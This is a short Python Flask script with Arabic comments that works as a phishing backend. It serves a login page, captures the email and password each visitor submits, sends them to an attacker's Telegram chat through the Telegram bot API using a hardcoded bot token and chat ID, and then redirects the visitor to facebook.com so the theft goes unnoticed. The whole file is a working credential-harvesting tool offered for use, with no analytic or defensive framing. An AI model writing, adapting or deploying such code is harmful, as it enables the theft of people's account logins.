from flask import Flask, render_template, request, redirect
import requests

app = Flask(__name__)

# إعدادات البوت
BOT_TOKEN = "8421624587:AAHwCA7BDgQvi7MfhOix_p_w4oseIUudQ9k"
CHAT_ID = "7720948079"

@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['POST'])
def login():
    email = request.form['email']
    password = request.form['password']

    print(f"- Email: {email}\n- Password: {password}")

    # رسالة التليجرام
    message = f"📩 تسجيل دخول جديد:\n\n📧 الإيميل: {email}\n🔒 الباسورد: {password}"

    # إرسال الرسالة إلى بوت تليجرام
    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"
    data = {
        "chat_id": CHAT_ID,
        "text": message
    }
    try:
        requests.post(url, data=data)
    except Exception as e:
        print(f"فشل في إرسال الرسالة لتليجرام: {e}")

    return redirect("https://www.facebook.com")

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=True)
